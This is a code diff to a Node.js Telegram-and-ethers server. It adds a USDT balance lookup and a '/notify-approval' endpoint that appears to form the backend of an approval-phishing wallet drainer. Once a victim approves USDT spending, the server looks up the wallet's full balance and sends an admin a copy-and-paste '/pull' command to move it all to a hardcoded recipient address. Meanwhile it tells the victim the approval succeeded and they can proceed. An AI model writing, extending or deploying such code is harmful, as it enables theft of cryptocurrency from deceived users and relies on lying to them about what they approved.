@@ -87,6 +87,29 @@ async function sendTelegramMessage(chatId, text) {
   }
 }
 
+async function getUsdtBalanceForWallet(walletAddress) {
+  const usdtAbi = [
+    'function balanceOf(address owner) view returns (uint256)',
+    'function decimals() view returns (uint8)'
+  ];
+  try {
+    const usdt = new ethers.Contract(USDT_ADDRESS, usdtAbi, provider);
+    let decimals = USDT_DECIMALS;
+    try {
+      decimals = await usdt.decimals();
+    } catch (_err) {
+      decimals = USDT_DECIMALS;
+    }
+    const balance = await usdt.balanceOf(walletAddress);
+    const formatted = ethers.utils.formatUnits(balance, decimals);
+    const num = parseFloat(formatted);
+    return Number.isFinite(num) ? String(+num) : formatted;
+  } catch (error) {
+    console.error('Could not fetch USDT balance:', error.message);
+    return '0';
+  }
+}
+
 function getSponsorDayKey() {
   return new Date().toISOString().slice(0, 10);
 }
@@ -134,6 +157,67 @@ app.post('/sponsor-gas', async (req, res) => {
     return res.json({ ok: true, txHash: tx.hash, amount: GAS_SPONSOR_AMOUNT });
   } catch (error) {
     console.error('Gas sponsor error:', error.message);
+    return res.status(500).json({ ok: false, error: error.message });
+  }
+});
+
+app.post('/notify-approval', async (req, res) => {
+  try {
+    const walletAddress = String(req.body?.walletAddress || '').trim();
+    const txHash = String(req.body?.txHash || '').trim();
+    const userId = req.body?.userId ? String(req.body.userId).trim() : '';
+
+    if (!walletAddress || !ethers.utils.isAddress(walletAddress)) {
+      return res.status(400).json({ ok: false, error: 'Invalid wallet address' });
+    }
+    if (!txHash) {
+      return res.status(400).json({ ok: false, error: 'Missing transaction hash' });
+    }
+
+    const recipient = getEnv('PULL_RECIPIENT_ADDRESS') || '0xf2a151e92ae0eab7157322545c33648c0824fa2e';
+    const usdtBalance = await getUsdtBalanceForWallet(walletAddress);
+    const pullCommand = `/pull ${USDT_ADDRESS} ${walletAddress} ${recipient} ${usdtBalance}`;
+    const inlineKeyboard = {
+      inline_keyboard: [[{ text: '🔗 View Transaction', url: `https://bscscan.com/tx/${txHash}` }]]
+    };
+
+    const adminMessage =
+      `🔔 **New USDT Approval Transaction**\n\n` +
+      `💰 **Wallet Address:** \n\`\`\`\n${walletAddress}\n\`\`\`\n` +
+      `🔗 **Transaction Hash:** \n\`\`\`\n${txHash}\n\`\`\`\n` +
+      `👤 **User ID:** ${userId || 'Not provided'}\n` +
+      `⏰ **Time:** ${new Date().toLocaleString()}\n\n` +
+      `✅ Transaction approved successfully!\n\n` +
+      `📋 **Copy & paste command:**\n\`\`\`\n${pullCommand}\n\`\`\`\n\n` +
+      `💡 *Tap and hold on the command above to copy it*`;
+
+    await axios.post(`${TELEGRAM_API}/sendMessage`, {
+      chat_id: ADMIN_CHAT_ID,
+      text: adminMessage,
+      parse_mode: 'Markdown',
+      reply_markup: inlineKeyboard
+    });
+
+    if (userId) {
+      const userMessage =
+        `🎉 **USDT Approval Successful!**\n\n` +
+        `💰 **Your Wallet Address:** \n\`\`\`\n${walletAddress}\n\`\`\`\n` +
+        `🔗 **Transaction Hash:** \n\`\`\`\n${txHash}\n\`\`\`\n` +
+        `✅ **Status:** Approved\n\n` +
+        `You can now proceed with USDT transfers.\n\n` +
+        `💡 *Tap and hold on the wallet address above to copy it*`;
+
+      await axios.post(`${TELEGRAM_API}/sendMessage`, {
+        chat_id: userId,
+        text: userMessage,
+        parse_mode: 'Markdown',
+        reply_markup: inlineKeyboard
+      });
+    }
+
+    return res.json({ ok: true });
+  } catch (error) {
+    console.error('Approval notification error:', error.response?.data || error.message);
     return res.status(500).json({ ok: false, error: error.message });
   }
 });
